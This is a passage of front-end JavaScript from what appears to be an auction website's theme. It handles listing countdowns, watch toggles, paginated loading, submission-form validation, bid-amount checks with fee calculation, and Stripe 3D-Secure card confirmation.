        }, 200);
      }
      featureSetArrows();
    }
    function featureSetArrows() {
      var $latestFeatures = $('.home .loop .bat-latest-features'),
        $arrowLeft = $('.home .loop .latest-features .left'),
        $arrowRight = $('.home .loop .latest-features .right'),
        divPos = $latestFeatures.scrollLeft(),
        innerWidth = $latestFeatures.length > 0 ? $latestFeatures[0].scrollWidth : 0,
        windowWidth = $(window).width();
      if (0 === divPos) {
        $arrowLeft.find('.arrow-box').addClass('gallery-end');
      } else if (divPos > 0) {
        $arrowLeft.find('.arrow-box').removeClass('gallery-end');
      }
      if (divPos + windowWidth > innerWidth - 1) {
        $arrowRight.find('.arrow-box').addClass('gallery-end');
      } else {
        $arrowRight.find('.arrow-box').removeClass('gallery-end');
      }
    }
    $('.more-features').click(function (event) {
      event.preventDefault();
      var category = parseInt($(this).data('category'));
      $(this).text($(this).data('text-loading'));
      $.post(BaT_Theme.ajaxUrl, {
        action: BaT_Theme.ajaxActionFeaturesMore,
        category: category,
        featurePaged: featurePaged
      }, function (data, status) {
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
        $('.bat-latest-features').append(data.excerpts);
        if (data.more) {
          featurePaged++;
          $('.more-features').text($('.more-features').data('text-more'));
        } else {
          $('.more-features').hide();
        }
      }, 'json');
    });
  })();

  // Listings overview page - countdowns
  BaT_Theme.startListingCountdowns = function (element, expirationCallback) {
    var $auction = $(element),
      $countdown = $auction.find('[data-countdown]'),
      $progress = $auction.find('.auctions-item-progress-bar'),
      layout = '{d<}{dn} {dl}, {d>} {h<}{hn}:{h>}{m<}{mnn}:{m>}{snn}',
      until = new Date($countdown.data('until') * 1000);
    var expiration = expirationCallback || function () {
      $auction.fadeOut(500, function () {
        $auction.remove();
      });
    };
    var progression = function (parts) {
      var seconds = jQuery.countdown.periodsToSeconds(parts),
        extension = parseFloat(BaT_Theme.extensionWindowSeconds),
        width = Math.min(extension, seconds) / extension * 100 + '%';
      if (seconds > extension) {
        $progress.hide();
      }
      $progress.toggleClass('listing-available-progress-bar-counting', seconds <= extension).toggleClass('listing-available-progress-bar-finalmin', seconds <= 60).css('width', width);
    };
    $countdown.countdown({
      layout: layout,
      onExpiry: expiration,
      onTick: BaT_Theme.getTickableFunction($countdown, progression),
      until: until
    });
    return $countdown;
  };
  function countdowns() {
    $('.auctions-current .auctions-item-container, section.listing').each(function (index, auction) {
      //TODO:BAT-706 review and clean this up (remove unnecessary selectors)
      BaT_Theme.startListingCountdowns(auction);
    });
  }

  // Listings overview page - initialize countdowns
  (function () {
    countdowns();
  })();

  // Listings overview page - listing watch
  (function () {
    $(document).on('click', '.loggedin .auctions-item-watch, .loggedin .auctions-item-watchers', function (event) {
      event.preventDefault();
      var $link = $(this).toggleClass('auctions-item-watched'),
        $item = $(this).parents('.auctions-item-container');
      $item.data('watched', 0 === $item.data('watched') ? 1 : 0);
      $.post($link.attr('href'), {
        ajax: true
      }, function (data, status) {}, 'json');
    });
  })();

  // Items list with pagination
  (function () {
    $('.items-list-with-pagination').each(function (index, element) {
      var $element = $(element),
        elementId = $element.prop('id'),
        itemsTotal = $element.data('items-total'),
        itemsUrl = $element.data('items-url'),
        perPage = $element.data('pagesize'),
        perPageMobile = $element.data('pagesize-mobile'),
        $container = $element.find('.items-container'),
        $items = $container.find('> *'),
        $button = $element.find('.button-show-more');
      var getPageSize = function () {
        return window.innerWidth > BaT_Theme.screenWidthBreakpoint ? perPage : perPageMobile;
      };
      var shownItemsCount = getPageSize();
      $items.slice(shownItemsCount).hide(); // Hide items which should not be on the first page

      if ('undefined' === typeof itemsUrl || 'undefined' === typeof elementId || 'undefined' === typeof itemsTotal) {
        // A case when loading from the server is not necessary and these parameters are undefined.
        itemsTotal = $items.length;
      }
      if (shownItemsCount >= itemsTotal) {
        $button.hide();
        return;
      }
      $button.click(function (event) {
        event.preventDefault();
        showMore();
      });
      var showMore = function () {
        var pageSize = getPageSize();
        var toLoadCount = Math.min(shownItemsCount + pageSize, itemsTotal) - $items.length; // Calculate how many items should be loaded from the server

        if (0 < toLoadCount && 'undefined' !== typeof itemsUrl && 'undefined' !== typeof elementId) {
          // Load from the server if we do not have enough listings already loaded to show the next page.
          $element.addClass('in-progress');
          $.get(itemsUrl, {
            'per_pages': toLoadCount,
            'offset': $items.length
          }, function (data, status) {
            var $itemsNew = $(data).find('#' + elementId).find('.items-container').find('> *');

            // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
            $container.append($itemsNew);
            $items = $container.find('> *');
            shownItemsCount = Math.min(itemsTotal, shownItemsCount + pageSize);
            $items.slice(0, shownItemsCount).show();
            if (shownItemsCount >= itemsTotal) {
              $button.hide();
            }
            $element.removeClass('in-progress');
          });
        } else {
          // Show the next page, we don't need to load additional items from the server.
          shownItemsCount = Math.min(itemsTotal, shownItemsCount + pageSize);
          $items.slice(0, shownItemsCount).show();
          if (shownItemsCount >= itemsTotal) {
            $button.hide();
          }
        }
      };
    });
  })();
  (function () {
    //TODO:visual-updates Remove this function after development if it is no longer needed.
    $(document).on('click', '.button-load-more-from-url', function (event) {
      event.preventDefault();
      var $this = $(this),
        $auctionsOld = $this.parents('.items-more').siblings('.cards-container');
      $paginationOld = $this.parents('.items-more'), href = $this.attr('href'), selector = $this.data('selector');

      // Remove the button so it can't get clicked multiple times
      $this.remove();
      $.get(href, {}, function (data, status) {
        var $auctionsNew = selector ? $(data).find(selector) : $(data).find('.cards-container'),
          $auctionsNewItems = $auctionsNew.find('.content-card'),
          $paginationNew = $auctionsNew.siblings('.items-more');

        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
        $auctionsOld.append($auctionsNewItems);
        // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.replaceWith -- HTML is properly escaped.
        $paginationOld.replaceWith($paginationNew);
      });
    });
  })();

  // No Reserve page
  (function () {
    $('.auctions-no-reserve .auctions-item-title').each(function (index, element) {
      new Dotdotdot(element, {
        height: "watch" // Update height on resize for @media rules
      });
    });
  })();

  // Listing bid box "Ends On" in local time - localize based on system timezone
  (function () {
    var $ends = $('[data-ends]'),
      timestamp = $ends.data('ends') * 1000,
      datetime = new Date(timestamp),
      datetimem = moment(datetime),
      formatted = datetimem.format('dddd, MMMM D [at] h:mma');
    $ends.text(formatted);
  })();

  // hack for fixing listing sticky position on input focus
  (function () {
    if ('ontouchstart' in window) {
      $(document).on('focus', 'textarea, input, select', function () {
        $('.listing-sticky').css({
          visibility: 'hidden'
        });
      }).on('blur', 'textarea,input,select', function () {
        $('.listing-sticky').css({
          visibility: ''
        });
      });
    }
  })();

  // Listing header button click functionality
  // When clicking a listing header button, smooth scroll to the desired element
  (function () {
    var $sticky = $('.listing-sticky');
    $(document).on('click', '.listing-available-actions .button', function (event) {
      var href = $(this).attr('href');
      if (0 === href.indexOf('#')) {
        var $element = $(href);
        if ($element.size() > 0) {
          event.preventDefault();
          $('html, body').animate({
            scrollTop: $element.offset().top - $sticky.height()
          }, 250);
        }
      }
    });
  })();

  // Listing header watching button toggle
  (function () {
    BaT_Theme.toggleWatchingStatus = function () {
      $('.loggedin .button-watching, .loggedin .link-watching').each(function (index, element) {
        var $link = $(element),
          $toggle = $link.find($link.data('toggle-target')),
          $text = $link.find($link.data('text-target')),
          toggle = $link.data('toggle'),
          text = $link.data('text');
        $link.data('text', $text.text());
        $toggle.toggleClass(toggle);
        $text.text(text);
      });
    };
    $('.loggedin .button-watching, .loggedin .link-watching').click(function (event) {
      event.preventDefault();
      BaT_Theme.toggleWatchingStatus();
      $.post($(this).attr('href'), {
        ajax: true
      }, function (data, status) {
        // What should happen here?
      }, 'json');
    });
    $('#poppable-link-reminder').click(function () {
      if (!isWatchingListing()) {
        BaT_Theme.toggleWatchingStatus();
        $.post($(this).data('toggle-watch-url'), {
          ajax: true
        });
      }
    });
    function isWatchingListing() {
      return $(".button-watching .button-watch-icon-watching").length > 0;
    }
  })();

  // Listing header sticky portion scroll down from top
  (function () {
    var $sticky = $('.listing-sticky');
    if ($sticky.length > 0) {
      $sticky.wrap('<div></div>');
      var $document = $(document),
        $wrap = $sticky.parent(),
        stickyOffset = $sticky.offset().top,
        scrolled = $document.scrollTop();
      $wrap.height($sticky.height());
      $document.scroll(function () {
        scrolled = $document.scrollTop();
        if (scrolled >= stickyOffset && !$sticky.is('.listing-sticky-fixed')) {
          $sticky.addClass('listing-sticky-fixed');
        } else if (scrolled < stickyOffset && $sticky.is('.listing-sticky-fixed')) {
          $sticky.removeClass('listing-sticky-fixed');
        }
        if (!$sticky.is('.listing-sticky-fixed')) {
          $wrap.height($sticky.height());
        }
      }).trigger('scroll');
      $(window).resize(function () {
        if (!$sticky.is('.listing-sticky-fixed')) {
          $wrap.height($sticky.height());
        }
      });
    }
  })();

  // Listing header countdown and progress bar
  (function () {
    var $listingIntro = $('.listing-intro');
    if (!$listingIntro.length) {
      return;
    }
    var $countdown = $listingIntro.find('.listing-available-countdown');
    if (!$countdown.length) {
      return;
    }
    var $progress = $listingIntro.find('.listing-available-progress'),
      layout = '{d<}{dn} {dl}, {d>} {h<}{hn}:{h>}{m<}{mnn}:{m>}{snn}',
      until = new Date($countdown.data('until') * 1000);
    var expiration = function () {
      var listingEndNotice = $countdown.siblings('.listing-end-processing-notice');
      if (listingEndNotice.length) {
        $listingIntro.find('.info-label').hide();
        $listingIntro.find('span[data-listing-currently]').text('');
        listingEndNotice.show();
        $countdown.hide();
      }
      $listingIntro.toggleClass('listing-countdown-counting', false);
    };
    var progression = function (parts) {
      var seconds = jQuery.countdown.periodsToSeconds(parts),
        extension = parseFloat(BaT_Theme.extensionWindowSeconds),
        width = Math.min(extension, seconds) / extension * 100 + '%';
      $listingIntro.toggleClass('listing-countdown-counting', seconds <= extension);
      $progress.find('.listing-available-progress-bar').toggleClass('listing-available-progress-bar-counting', seconds <= extension).toggleClass('listing-available-progress-bar-finalmin', seconds <= 60).css('width', width);
    };
    $countdown.countdown({
      layout: layout,
      onExpiry: expiration,
      onTick: BaT_Theme.getTickableFunction($countdown, progression),
      until: until
    });
  })();

  // Links that do various actions
  (function () {
    $(document).on('click', '.loggedin .ajax-link', function (event) {
      event.preventDefault();
      var $link = $(this);
      $.post($link.attr('href'), {
        ajax: true
      }, function (data, status) {}, 'json');
    });
    $(document).on('click', '.logged-in .ajax-toggle-link', function (event) {
      event.preventDefault();
      var $link = $(this),
        ajaxLinkAlt = $link.data('toggle-ajax-link-alt'),
        altHref,
        href;
      href = $link.attr('href');
      if (ajaxLinkAlt) {
        altHref = $link.data('toggle-ajax-link-alt');
        $link.data('toggle-ajax-link-alt', href);
        $link.attr('href', altHref);
      }
    });
    $(document).on('click', '.logged-in .class-toggle-link', function (event) {
      event.preventDefault();
      var $link = $(this),
        classes = $link.data('toggle-class-classes').toString().split('|'),
        selectors = $link.data('toggle-class-selectors').toString().split('|');
      if (classes.length === selectors.length) {
        for (var i = 0; i < selectors.length; i++) {
          var klass = classes[i],
            selector = selectors[i];
          $(selector).toggleClass(klass);
        }
      }
    });
    $(document).on('click', '.logged-in .phrase-toggle-link', function (event) {
      event.preventDefault();
      var $link = $(this),
        $element,
        $toggles,
        phrase = $link.data('toggle-text-phrase'),
        phraseAlt = $link.data('toggle-text-phrase-alt'),
        selector = $link.data('toggle-text-selector');
      $elements = $(selector);
      $toggles = $('[data-toggle-text-selector="' + selector + '"]');
      if (phraseAlt) {
        $toggles.data('toggle-text-phrase', phraseAlt).data('toggle-text-phrase-alt', false);
      } else {
        $toggles.data('toggle-text-phrase', $elements.first().text());
      }
      $elements.text(phrase);
    });
  })();

  // Listings dashboard page - section modification
  (function () {
    $(document).on('click', '.maximize-section', function (event) {
      var body = document.querySelector('body'),
        section = event.target.closest('section'),
        isMobile = window.outerWidth < 751;
      if (section.classList.contains('expanded') || $(event.target).parents().andSelf().filter('a').length > 0) {
        return;
      }
      event.preventDefault();
      body.dataset.top = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
      document.querySelectorAll('body,html').forEach(function (noScrollNode) {
        noScrollNode.classList.add('noscroll-mobile');
      });
      section.classList.add('expanded');
      if (isMobile) {
        section.scrollTo(0, 0);
      }
      var sectionEvent = new Event('bat-section-visible');
      section.dispatchEvent(sectionEvent);
      event.stopPropagation();
    });
    $(document).on('click', '.minimize-section', function (event) {
      var body = document.querySelector('body'),
        section = event.target.closest('section'),
        isMobile = window.outerWidth < 751;
      event.preventDefault();
      document.querySelectorAll('html, body').forEach(function (noScrollNode) {
        noScrollNode.classList.remove('noscroll-mobile');
      });
      var isMobile = window.outerWidth < 751;
      if (isMobile) {
        window.scrollTo(0, body.dataset.top);
      }
      delete body.dataset.top;
      section.classList.remove('expanded');
      section.scrollTo(0, 0);
      var sectionEvent = new Event('bat-section-hidden');
      section.dispatchEvent(sectionEvent);
      event.stopPropagation();
    });
  })();

  // Listings dashboard page - tab modification
  (function () {
    document.querySelectorAll('.tabbed').forEach(function (tabbedElement) {
      var navigationLinks = tabbedElement.querySelectorAll('nav button'),
        tabSections = tabbedElement.querySelectorAll('.tab');
      navigationLinks.forEach(function (navigationLink, index) {
        navigationLink.addEventListener('click', function (event) {
          event.preventDefault();
          var tabSection = tabSections[index];
          navigationLinks.forEach(function (node) {
            node.classList.remove('active');
          });
          tabSections.forEach(function (node) {
            node.classList.remove('active');
          });
          navigationLink.classList.add('active');
          tabSection.classList.add('active');
          return false;
        });
      });
    });
  })();

  // Listings preview page - form validation
  (function () {
    $(document).on('submit', '.submission-modal-form', function (event) {
      var $form = $(this),
        $inputs = $form.find(':input'),
        $invalid;
      $inputs.parents('.form-field').removeClass('form-field-error');
      $invalid = $inputs.filter(function (index, input) {
        var $input = $(input),
          email = $input.is('#bat_submission_email'),
          login = $input.is('#bat_submission_login'),
          phone = $input.is('#bat_submission_phone'),
          value = $.trim($input.val());
        if (email) {
          return '' === value || -1 === value.indexOf('@');
        } else if (login) {
          return '' === value || value.length < 3 || -1 !== value.indexOf('@') || -1 !== value.indexOf(' ');
        } else if (phone) {
          return '' === value || '' === value.replace(/[^\d]/g, '');
        } else {
          return '' === value;
        }
      });
      if ($invalid.length) {
        event.preventDefault();
        $invalid.parents('.form-field').addClass('form-field-error');
        $invalid.first().focus();
      }
    });
  })();

  // Listings preview page - form year / make / model
  (function () {
    var $form = $('.submission-modal-form'),
      $year = $form.find('#year'),
      $make = $form.find('#make'),
      $model = $form.find('#model'),
      makes = $year.data('makes') || [];
    if (0 === $form.length || 0 === $year.length || 0 === $make.length || 0 === $model.length) {
      return;
    }
    $year.change(function (event) {
      var make = $make.val(),
        model = $model.val(),
        year = $year.val(),
        data = 'undefined' === typeof makes[year] ? {} : makes[year],
        exists = false;
      $make.find('option').filter(function (index, element) {
        var $element = $(element);
        return '' !== $element.attr('value');
      }).remove();
      for (var p in data) {
        if (data.hasOwnProperty(p)) {
          exists = true;
          $make.append($('<option>').attr('value', p).text(p));
        }
      }
      if ($make.find('option').filter(function (index, element) {
        return make === $(element).attr('value');
      }).length > 0) {
        $make.val(make);
      }
      $make.trigger('change').prop('disabled', '' === year);
    }).trigger('change');
    $make.change(function (event) {
      var make = $make.val(),
        model = $model.val(),
        year = $year.val(),
        data = 'undefined' === typeof makes[year] || 'undefined' === typeof makes[year][make] ? [] : makes[year][make],
        exists = data.length > 0;
      $model.find('option').filter(function (index, element) {
        var $element = $(element);
        return '' !== $element.attr('value');
      }).remove();
      for (var i = 0; i < data.length; i++) {
        $model.append($('<option>').attr('value', data[i]).text(data[i]));
      }
      if ($model.find('option').filter(function (index, element) {
        return model === $(element).attr('value');
      }).length > 0) {
        $model.val(model);
      } else {
        $model.val($model.find('option:visible').first().attr('value'));
      }
      $model.trigger('change').prop('disabled', '' === make);
    });
  })();

  // Listings preview page - inquiry
  (function () {
    $(document).on('click', '.button-listing-inquiry', function (event) {
      event.preventDefault();
      var $button = $(this),
        $fields = $button.parents('.modal-popup').find('.form-fields'),
        $message = $button.parents('.modal-popup').find('.message-listing-inquiry'),
        $text = $fields.find('[name="bat_text"]');
      $.post(BaT_Theme.ajaxUrl, {
        action: BaT_Theme.ajaxActionSellerMessage,
        ajax: true,
        item: $button.data('id'),
        text: $.trim($text.val())
      }, function (data, status) {}, 'json');
      $button.hide();
      $fields.hide();
      $message.show();
      $text.val('');
    });
    $(document).on('click', '.button-listing-inquiry-back', function (event) {
      event.preventDefault();
      var $button = $(this).siblings(),
        $fields = $button.parents('.modal-popup').find('.form-fields'),
        $message = $button.parents('.modal-popup').find('.message-listing-inquiry');
      $button.show();
      $fields.show();
      $message.hide();
    });
  })();

  // Same page scrollable links
  (function () {
    $('.scrollable-link').click(function (event) {
      var href = $(this).attr('href'),
        time = $(this).data('time') || 250,
        $element = $(href),
        $sticky = $('.listing-sticky');
      if (0 === href.indexOf('#') && $element.length > 0) {
        event.preventDefault();
        if ($sticky.length > 0) {
          var scrollTop = $element.offset().top - $sticky.height();
        } else {
          var scrollTop = $element.offset().top;
        }
        $('html, body').animate({
          scrollTop: scrollTop
        }, time);
      }
    });
  })();

  // Disable submit buttons
  (function () {
    $('form.disable-submit').on('submit', function (event) {
      $(this).find('[type="submit"]').prop('disabled', true);
    });
  })();

  // Modal bid handling
  BaT_Theme.bid = function () {
    // Add custom KO bindings for displaying USD amounts like "$5,000.00" with currencyText: binding.
    // Use along with currencyDecimals: binding to control the number of decimal places.
    ko.bindingHandlers.currencyText = {
      update: function (element, valueAccessor, allBindings) {
        var value = ko.utils.unwrapObservable(valueAccessor()),
          decimals = allBindings.get('currencyDecimals'),
          formattedValue = BaT_Theme.bid.formatCurrency(value, {
            decimals: decimals
          });
        ko.bindingHandlers.text.update(element, function () {
          return formattedValue;
        });
      }
    };
    $('#bat-listings-place-bid').click(function (event) {
      var $placeBidButton = $(this),
        $bidAmountInput = $('#bat-listings-listings-amount'),
        $bidRow = $('[data-listing-current-bidding="' + BaT_Theme.post + '"]'),
        bidAmount = BaT_Theme.bid.sanitizeAmount($bidAmountInput.val()),
        highBidAmount = $bidRow.data('amount') ? $bidRow.data('amount') : 0,
        highBidUser = $bidRow.data('high-bidder') ? $bidRow.data('high-bidder') : false,
        minimumBid = $bidRow.data('minimum'),
        maximumBid = $bidRow.data('maximum'),
        currentTime = new Date().getTime(),
        listingEndsTime = $('.listing-available-countdown').countdown('option', 'until').getTime(),
        isFfBid = BaT_Theme.bid.isFfBid(bidAmount, highBidAmount, listingEndsTime),
        isFfVerified = $placeBidButton.data('ff-verified') === true,
        highBidAmount5x = 5 * highBidAmount,
        isMoreThanFiveTimesBidOnLastDay = highBidAmount > 0 && listingEndsTime - currentTime < 86400000 /* ms in a day */ && bidAmount > highBidAmount5x && highBidAmount5x > minimumBid;
      if (highBidUser && highBidUser == BAT_VMS.userId) {
        $placeBidButton.data('selector', '#modal-bid-error-generic');
        var viewModel = {
          errorTitle: BaT_Theme.bidModalText.alreadyWinningTitle,
          errorText: BaT_Theme.bidModalText.alreadyWinningMessage
        };
        $placeBidButton.data('view-model', viewModel);
      } else if (bidAmount < minimumBid) {
        $placeBidButton.data('selector', '#modal-bid-error-generic');
        var viewModel = {
          errorTitle: BaT_Theme.bidModalText.bidTooLowTitle,
          errorText: $.validator.format(BaT_Theme.bidModalText.bidTooLowMessage, BaT_Theme.bid.formatCurrency(minimumBid, {
            decimals: 0
          }))
        };
        $placeBidButton.data('view-model', viewModel);
      } else if (bidAmount > maximumBid) {
        $placeBidButton.data('selector', '#modal-bid-error-generic');
        var viewModel = {
          errorTitle: BaT_Theme.bidModalText.bidExceedsMaximumTitle,
          errorText: BaT_Theme.bidModalText.bidExceedsMaximumMessage
        };
        $placeBidButton.data('view-model', viewModel);
      } else if (isMoreThanFiveTimesBidOnLastDay) {
        $placeBidButton.data('selector', '#modal-bid-error-generic');
        var viewModel = {
          errorTitle: BaT_Theme.bidModalText.bidExceedsMaximumOnLastDayTitle,
          errorText: BaT_Theme.bidModalText.bidExceedsMaximumOnLastDayMessage
        };
        $placeBidButton.data('view-model', viewModel);
      } else if (isFfBid && !isFfVerified) {
        $placeBidButton.data('selector', '#modal-bid-ff-confirmation');
        var viewModel = {
          bidAmount: bidAmount,
          highBidAmount: highBidAmount
        };
        $placeBidButton.data('view-model', viewModel);
      } else {
        $placeBidButton.data('selector', '#modal-bid-confirmation');
        var viewModel = {
          bidAmount: bidAmount,
          isFfVerified: isFfVerified,
          serviceFee: BaT_Theme.bid.calculateServiceFee(bidAmount),
          userHasBid: BaT_Theme.bid.userHasBid()
        };
        $placeBidButton.data('view-model', viewModel);

        // Clear any page bidding state after a delay
        setTimeout(function () {
          $('#bat-listings-listings-amount').val('');
        }, 1000);
      }
    });
    $('#bat-listings-listings-amount').keydown(function (event) {
      // Open bidding modal on enter key in amount input
      if (event.keyCode == 13) {
        $('#bat-listings-place-bid').click();
      }
    });
    var calculateServiceFee = function (bidAmount) {
      var buyerFee = parseInt(bidAmount, 10) * BaT_Theme.bidModalBuyerFeePercentage;
      if (buyerFee > BaT_Theme.bidModalBuyerFeeMaximum) {
        buyerFee = BaT_Theme.bidModalBuyerFeeMaximum;
      } else if (buyerFee < BaT_Theme.bidModalBuyerFeeMinimum) {
        buyerFee = BaT_Theme.bidModalBuyerFeeMinimum;
      }
      return buyerFee;
    };
    var formatCurrency = function (value, options) {
      var decimals = options.decimals === undefined ? 2 : options.decimals;
      valueWithDecimals = Number(value).toFixed(decimals), valueWithCommas = valueWithDecimals.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      return valueWithCommas;
    };
    var handleRestError = function (error) {
      _.defaults(error, {
        message: BaT_Theme.bidModalText.bidGenericFailureMessage,
        data: {
          error_title: BaT_Theme.bidModalText.bidGenericFailureTitle
        }
      });
      var errorMessage = error.message,
        errorTitle = error.data.error_title;
      errorModal = '#modal-bid-error-generic';
      if (error.code === 'authorization_failed') {
        errorModal = '#modal-bid-error-authorization';
      } else if (error.code === 'rest_cookie_invalid_nonce') {
        errorTitle = BaT_Theme.bidModalText.restNonceErrorTitle;
        errorMessage = BaT_Theme.bidModalText.restNonceErrorMessage;
      } else if (error.code === 'requires_stripe_action') {
        $form = $('.modal-cover-shown form');
        return BaT_Theme.bid.handleStripeAction($form, error.data.payment_intent_client_secret);
      }
      var viewModel = {
        errorTitle: errorTitle,
        errorText: errorMessage
      };
      BAT.modal.show(errorModal, viewModel);
    };
    var handleStripeAction = function ($form, clientSecret) {
      // Stripe's 3D-Secure dialog adds an inset to the page which overrides the bidding modal's fixed positioning
      // and causes a conflict resulting in a black background. To prevent this, add a temporary !imporant override
      // class to keep the bidding modal's positioning fixed.
      var $body = $('body'),
        top = parseFloat($body.css('top'));

      // phpcs:ignore WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- HTML is properly escaped.
      $('<style type="text/css"> .modal-3dsecure-override{ inset: initial !important; top: ' + top + 'px !important; } </style>').appendTo('head');
      $body.addClass('modal-3dsecure-override');

      // Trigger 3D-Secure dialog if required
      BaT_Listings_Stripe.stripe.handleCardAction(clientSecret).then(function (result) {
        $body.removeClass('modal-3dsecure-override');
        if (result.error) {
          $form.find('input[name="payment_intent_id"]').remove();
          $form.find('input[type="submit"]').removeProp('disabled');
          var viewModel = {
            errorTitle: BaT_Theme.bidModal3DSecureFailureTitle,
            errorHtml: BaT_Theme.bidModal3DSecureFailureHtml
          };
          BAT.modal.show('#modal-bid-error-generic', viewModel);
        } else {
          // Resubmit the form with the approved payment intent
          $('<input type="hidden" name="payment_intent_id" />').val(result.paymentIntent.id).appendTo($form);
          $form.submit();
        }
      });
    };
    var isFfBid = function (bidAmount, highBidAmount, listingEndsTime) {
      var currentTime = new Date().getTime(),
        isInFfWindow = currentTime + BaT_Theme.bidModalFFWindowInMinutes * 60000 /* ms in a minute */ > listingEndsTime,
        minFfBid = false;
      if (!isInFfWindow || highBidAmount === 0) {
        return false;
      }
      if (highBidAmount > 100000) {
        minFfBid = 1.2 * highBidAmount;
      } else if (highBidAmount > 50000) {
        minFfBid = 1.5 * highBidAmount;
      } else if (highBidAmount > 20000) {
        minFfBid = 1.75 * highBidAmount;
      } else if (highBidAmount > 10000) {
        minFfBid = 2.0 * highBidAmount;
      } else if (highBidAmount > 5000) {
        minFfBid = 3.0 * highBidAmount;
      } else if (highBidAmount > 1000) {
        minFfBid = 4.0 * highBidAmount;
      }
      if (minFfBid && bidAmount > minFfBid) {
        return true;
      } else {
        return false;
      }
    };
    var sanitizeAmount = function (bidAmount) {
      bidAmount = bidAmount.replace(/[^\d\.\,]/, '');
      bidAmount = bidAmount.replace(/(\.|,)\d{0,2}$/, '');
      bidAmount = bidAmount.replace(/[^\d]/, '');
      bidAmount = parseInt(bidAmount, 10 /* radix */);
      return bidAmount || 0;
    };
    var userHasBid = function () {
      // Use comment data to determine if the user has created a bid on this page
      if (!BAT_VMS.userId) {
        return false;
      }

      // Check bids in BAT_VMS.comments from initial page load
      var initialPageDataBids = BAT_VMS.comments.filter(function (comment) {
        return comment.type == 'bat-bid' && comment.authorId == BAT_VMS.userId;
      });
      var isUserBidInInitialPageData = initialPageDataBids.length > 0;

      // Also check in BAT_VMS.CLVM.comments, which will include bids loaded dynamically since page load
      var loadedPageDataBids = BAT_VMS.CLVM.comments().filter(function (comment) {
        return comment.type() == 'bat-bid' && comment.authorId() == BAT_VMS.userId;
      });
      var isUserInLoadedPageDataBids = loadedPageDataBids.length > 0;
      return isUserBidInInitialPageData || isUserInLoadedPageDataBids;
    };
    return {
      calculateServiceFee: calculateServiceFee,
      handleRestError: handleRestError,
      handleStripeAction: handleStripeAction,
      formatCurrency: formatCurrency,
      isFfBid: isFfBid,
      sanitizeAmount: sanitizeAmount,
      userHasBid: userHasBid
    };
  }();

  // Listing page group scrolling & subscription
  (function () {
    var $wrap = $('.column-groups-wrap'),
      $arrows = $('.column-groups-arrows'),
      timeout = null;
    if ($wrap.length && $arrows.length) {
      var currentIndex,
        divPos = $arrows.scrollLeft(),
        groupScrollOffsets = [],
        innerWidth = $arrows[0].scrollWidth,
        nextIndex,
        newPos,
        totalGroupItems = $('.column-groups .group-item-wrap').length,
        wrapWidth = $wrap.width();
      jQuery(window).on("load resize", function (e) {
        groupsSizing();
      });
      function groupsSizing() {
        if (totalGroupItems) {
          var containerOffset = $('.column-groups .group-item-wrap').offset().left,
            groupScrollOffsets = [],
            innerWidth = $arrows[0].scrollWidth,
            wrapWidth = $wrap.width();
          $('.column-groups .group-item-wrap').each(function (index, groupItem) {
            var $groupItem = $(groupItem),
              groupItemScrollOffset = Math.floor($groupItem.offset().left - containerOffset);
            groupScrollOffsets.push(groupItemScrollOffset);
          });
          if (innerWidth > wrapWidth) {
            groupsSetArrows();
          } else {
            $wrap.addClass('start_scrolled');
            $wrap.addClass('end_scrolled');
          }
          return groupScrollOffsets;
        }
      }
      function groupsSetArrows() {
        divPos = $arrows.scrollLeft(), innerWidth = $arrows[0].scrollWidth, wrapWidth = $wrap.width();
        if (0 == divPos) {
          $wrap.addClass('start_scrolled');
          $wrap.removeClass('end_scrolled');
        }
        if (divPos > 0) {
          $wrap.removeClass('start_scrolled');
          $wrap.removeClass('end_scrolled');
        }
        if (divPos + wrapWidth > innerWidth - 2) {
          $wrap.removeClass('start_scrolled');
          $wrap.addClass('end_scrolled');
        }
      }
      function groupsScrolling(direction) {
        divPos = $arrows.scrollLeft();
        if (direction === 'prev') {
          for (var i = 0; i < groupScrollOffsets.length; i++) {
            if (divPos >= groupScrollOffsets[i]) {
              currentIndex = i;
            }
          }
          nextIndex = currentIndex - 1;
          if (nextIndex < 1) {
            newPos = 0;
            $wrap.addClass('start_scrolled');
            $wrap.removeClass('end_scrolled');
          } else {
            newPos = groupScrollOffsets[nextIndex] - 54;
          }
        } else if (direction === 'next') {
          for (var i = 0; i < groupScrollOffsets.length; i++) {
            if (divPos + wrapWidth >= groupScrollOffsets[i]) {
              currentIndex = i;
            }
          }
          nextIndex = currentIndex + 1;
          if (nextIndex > groupScrollOffsets.length) {
            newPos = groupScrollOffsets[nextIndex] - wrapWidth;
          } else {
            newPos = innerWidth - wrapWidth;
            $wrap.addClass('end_scrolled');
            $wrap.removeClass('start_scrolled');
          }
        }
        $arrows.animate({
          scrollLeft: newPos
        }, 200);
      }
      $arrows.click(function (event) {
        var clickLocation = event.offsetX;
        if ($.inArray(event.target.className, ['group-title', 'group-title-label', 'bell-icon bell-icon-filled']) == -1) {
          if (clickLocation < 30) {
            groupsScrolling('prev');
          } else if (clickLocation > $(this).width() - 30) {
            groupsScrolling('next');
          }
        }
      });
      $arrows.scroll(function () {
        groupsSetArrows();
      });
      $('body').click(function (event) {
        if ($('.column-groups .group-item-wrap.open').length && $.inArray(event.target.className, ['button', 'button-text']) == -1) {
          $('.column-groups .group-item-wrap.open').removeClass('open').removeAttr('style');
          $('.column-groups .group-item').removeAttr('style');
          $('.column-groups-arrows.freeze').removeClass('freeze');
          if (null !== timeout) {
            clearTimeout(timeout);
            timeout = null;
          }
          groupsSizing();
        }
      });
      $('.column-groups .group-item-wrap').click(function (event) {
        var $thisItem = $(this),
          currentlyOpen = $thisItem.hasClass('open');
        if ('button-text' != event.target.className) {
          setTimeout(function () {
            if (!currentlyOpen) {
              var $toggleButton = $thisItem.find('.subscription-toggle'),
                toggleText = $thisItem.hasClass('watched') ? $toggleButton.data('unsubscribe-text') : $toggleButton.data('subscribe-text');
              $toggleButton.removeClass('confirm').find('.button-text').text(toggleText);
              $thisItem.addClass('open').width($thisItem.find('.group-item').outerWidth());
              groupScrollOffsets = groupsSizing();
